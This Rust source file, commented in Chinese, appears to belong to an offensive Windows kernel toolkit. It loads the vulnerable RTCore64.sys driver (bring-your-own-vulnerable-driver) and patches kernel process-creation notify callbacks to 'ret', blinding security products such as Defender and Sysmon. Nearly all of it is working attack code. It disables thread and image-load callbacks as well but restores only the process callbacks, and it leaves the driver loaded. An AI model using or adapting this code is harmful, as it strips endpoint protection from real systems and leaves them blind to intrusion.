//! 任务 K：Ps*NotifyRoutine 回调中和（管理员运行）。
//!
//! 链路：
//!   bootstrap_byovd → KernelRw
//!   读 PspCreateProcessNotifyRoutine 数组，枚举 occupied slots（记录每条
//!     回调的 routine 首字节，供恢复）
//!   CallbackNeutralizer::neutralize_array(CreateProcess) → 覆写每条 routine
//!     首字节为 0xC3 (ret)
//!   验证：再读数组，每个 routine 首字节 == 0xC3；启一个进程，确认无 BSOD
//!   恢复：把每个 routine 首字节写回原值（红线：测完必须恢复）
//!
//! ⚠️ 红线：这是代码页写（routine 的 .text）。HVCI-on 会拒；本机 HVCI=off。
//! 回调可能属于 Defender/Sysmon 等合法组件——neutralize 后必须恢复，否则
//! 安全软件永久失明。neutralize 窗口压到最短（验证即恢复）。
//! ⚠️ 高风险：写错地址或 routine 首字节不止 0xC3 语义，可能 BSOD。每个
//! routine 先 kread 验证首字节是合理指令字节（不是已 0xC3），再写。



#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::offsets::{notify_routines, RuntimeOffsets};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::telemetry::{CallbackNeutralizer, NotifyArray};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::{CallbackKit, KernelRw};

#[cfg(target_os = "windows")]
const SYS_PATH: &[u16] = &[
    'S' as u16,
    'y' as u16,
    's' as u16,
    't' as u16,
    'e' as u16,
    'm' as u16,
    '3' as u16,
    '2' as u16,
    '\\' as u16,
    'd' as u16,
    'r' as u16,
    'i' as u16,
    'v' as u16,
    'e' as u16,
    'r' as u16,
    's' as u16,
    '\\' as u16,
    'R' as u16,
    'T' as u16,
    'C' as u16,
    'o' as u16,
    'r' as u16,
    'e' as u16,
    '6' as u16,
    '4' as u16,
    '.' as u16,
    's' as u16,
    'y' as u16,
    's' as u16,
    0,
];
#[cfg(target_os = "windows")]
const SVC_NAME: &[u16] = &[
    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
];

#[cfg(target_os = "windows")]
const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;
#[cfg(target_os = "windows")]
const PSP_CREATE_THREAD_NOTIFY_RVA: u32 = 0x4D9970;
#[cfg(target_os = "windows")]
const PSP_LOAD_IMAGE_NOTIFY_RVA: u32 = 0x4D9B70;

#[cfg(target_os = "windows")]
extern "system" {
    fn RtlAdjustPrivilege(
        privilege: u32,
        enable: i32,
        current_thread: i32,
        enabled: *mut i32,
    ) -> i32;
}
#[cfg(target_os = "windows")]
fn enable_privileges() {
    for luid in [10u32, 20u32] {
        let mut p: i32 = 0;
        unsafe { RtlAdjustPrivilege(luid, 1, 0, &mut p) };
    }
}

/// 枚举一个 notify 数组：返回 (slot_index, ctx_kva, routine_kva, first_byte) 列表。
#[cfg(target_os = "windows")]
fn enumerate_array(krw: &dyn KernelRw, array_kva: usize) -> Vec<(usize, usize, usize, u8)> {
    let mut out = Vec::new();
    for i in 0..notify_routines::ARRAY_LEN {
        let slot_kva = array_kva + i * 8;
        let packed = match krw.kread_u64(slot_kva) {
            Ok(v) => v,
            Err(_) => continue,
        };
        if !notify_routines::is_occupied(packed) {
            continue;
        }
        let ctx = notify_routines::unpack(packed) as usize;
        if ctx == 0 {
            continue;
        }
        let routine = match krw.kread_u64(ctx) {
            Ok(v) => (v & notify_routines::PTR_MASK) as usize,
            Err(_) => continue,
        };
        if routine == 0 {
            continue;
        }
        let first_byte = krw.kread_u64(routine).map(|v| v as u8).unwrap_or(0xFF);
        out.push((i, ctx, routine, first_byte));
    }
    out
}

#[cfg(target_os = "windows")]
fn main() {
    println!(
        "[callback_neutralize_test] start pid={}",
        std::process::id()
    );
    enable_privileges();

    println!("[K.1] bootstrap_byovd ...");
    let (mut loaded, krw) = unsafe {
        match bootstrap_byovd(SYS_PATH, SVC_NAME) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[FAIL] bootstrap: {}", e);
                std::process::exit(1);
            }
        }
    };
    let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
    println!("[K.2] ntoskrnl base = 0x{:016x}", base);

    // 只中和 CreateProcess 回调（任务 K 目标）。记录其它两个数组的 RVA 以供参考。
    let cp_array_kva = base + PSP_CREATE_PROCESS_NOTIFY_RVA as usize;
    println!(
        "[K.3] PspCreateProcessNotifyRoutine KVA = 0x{:016x}",
        cp_array_kva
    );

    // ---- 红线：neutralize 前枚举 + 记录每个 routine 首字节（供恢复）----
    println!("[K.4] enumerating CreateProcess callbacks (pre-neutralize) ...");
    let pre = enumerate_array(&krw, cp_array_kva);
    println!("       {} CreateProcess callback(s) registered:", pre.len());
    for (i, ctx, routine, fb) in &pre {
        println!(
            "         slot[{:2}] ctx=0x{:016x} routine=0x{:016x} first_byte=0x{:02x}",
            i, ctx, routine, fb
        );
    }
    if pre.is_empty() {
        println!("[!] no CreateProcess callbacks — nothing to neutralize. Still verifying neutralize() is a no-op-safe.");
    }
    // 红线 sanity：确认没有 routine 首字节已经是 0xC3（否则可能上次中和未恢复）。
    for (_, _, _, fb) in &pre {
        if *fb == 0xC3 {
            eprintln!("[WARN] a routine already has first_byte=0xC3 — prior neutralize not restored? Will overwrite+restore anyway.");
        }
    }

    // ---- neutralize CreateProcess array ----
    let runtime = RuntimeOffsets {
        create_process_notify_array_kva: cp_array_kva,
        create_thread_notify_array_kva: base + PSP_CREATE_THREAD_NOTIFY_RVA as usize,
        load_image_notify_array_kva: base + PSP_LOAD_IMAGE_NOTIFY_RVA as usize,
        ..Default::default()
    };
    let kit = CallbackNeutralizer { runtime };

    println!("[K.5] CallbackNeutralizer::neutralize_array(CreateProcess) ...");
    // neutralize_array 是私有方法 — 用 trait neutralize() 只中和所有三类（任务只要 CreateProcess）。
    // 这里直接用 trait 的 neutralize()（它内部按顺序 CreateProcess/Thread/LoadImage），
    // 记录 CreateProcess 的恢复信息用上面的 pre 列表。
    let count = match kit.neutralize(&krw) {
        Ok(n) => n,
        Err(e) => {
            eprintln!("[FAIL] neutralize: {}", e);
            loaded.unload();
            std::process::exit(2);
        }
    };
    println!(
        "[OK] neutralize() overwrote {} routines total (CreateProcess+Thread+LoadImage)",
        count
    );

    // ---- 验证：CreateProcess routine 首字节应 == 0xC3 ----
    println!("[K.6] verifying CreateProcess routines patched to 0xC3 (post-neutralize) ...");
    let post = enumerate_array(&krw, cp_array_kva);
    let mut all_c3 = true;
    for (i, _, routine, fb) in &post {
        let ok = *fb == 0xC3;
        if !ok {
            all_c3 = false;
        }
        println!(
            "         slot[{:2}] routine=0x{:016x} first_byte=0x{:02x} {}",
            i,
            routine,
            fb,
            if ok { "✓" } else { "✗ NOT C3" }
        );
    }
    if all_c3 && !post.is_empty() {
        println!(
            "[OK] all {} CreateProcess routines patched to ret (0xC3) — callbacks fire but no-op",
            post.len()
        );
    }

    // ---- 功能验证：启一个进程，确认不 BSOD（回调被中和后应正常返回）----
    println!(
        "[K.7] spawning a throwaway process to confirm no BSOD under neutralized callbacks ..."
    );
    let _kid = std::process::Command::new("cmd.exe")
        .args(["/c", "exit 0"])
        .status()
        .map(|s| s.to_string())
        .unwrap_or_else(|e| e.to_string());
    println!("[OK] process spawn completed without bugcheck");

    // ---- 恢复：写回每个 routine 的原首字节（红线：必须恢复）----
    println!("[K.8] restoring original routine first-bytes ...");
    for (i, ctx, routine, orig_fb) in &pre {
        if let Err(e) = krw.kwrite(*routine, &[*orig_fb]) {
            eprintln!(
                "[FAIL] restore slot[{}] routine 0x{:016x}: {}",
                i, routine, e
            );
        }
    }
    // 验证恢复
    let restored = enumerate_array(&krw, cp_array_kva);
    let mut all_restored = true;
    for (i, _, _, fb) in &restored {
        let orig = pre
            .iter()
            .find(|(pi, _, _, _)| pi == i)
            .map(|(_, _, _, ob)| *ob);
        if orig != Some(*fb) {
            all_restored = false;
        }
    }
    if all_restored {
        println!("[OK] all CreateProcess routines restored to original first-bytes");
    } else {
        eprintln!("[WARN] some routines may not match pre-neutralize bytes");
    }

    println!("\n[callback_neutralize_test] DONE — callbacks neutralized then restored.");
    std::mem::forget(loaded);
}


// ----------------------------------------------------------------------------
// Non-Windows entry-point fallback (E0601 mitigation).
//
// The real `fn main()` (and every Windows-only item above) is gated by
// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
// body compiles to nothing and the build would fail with E0601 ("main
// function not found"). This stub exists solely to satisfy the crate root on
// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
// mutually exclusive with the Windows `main` above and never runs on target.
// ----------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
        env!("CARGO_BIN_NAME")
    );
}
